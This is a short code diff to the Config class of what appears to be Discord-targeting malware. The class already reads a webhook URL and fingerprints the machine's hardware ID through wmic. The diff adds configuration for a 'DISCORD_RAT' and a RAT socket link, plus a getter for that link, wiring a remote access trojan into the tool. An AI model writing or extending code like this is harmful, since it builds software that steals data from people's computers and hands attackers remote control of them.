@@ -12,6 +12,8 @@ class Config:
         self.webhook = self.data['HOOK']
         self.wh_avatar = self.data['WH_AVATAR']
         self.wh_name = self.data['WH_NAME']
+        self.discord_rat = self.data['DISCORD_RAT']
+        self.discord_rat_socket_link = self.data['DISCORD_RAT_SOCKET_LINK']
         
         # Developer Config, don't change, only if you know what you're doing
         self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
@@ -39,3 +41,6 @@ class Config:
     
     def get_name(self):
         return self.wh_name
+    
+    def get_discord_rat_link(self):
+        return self.discord_rat_socket_link
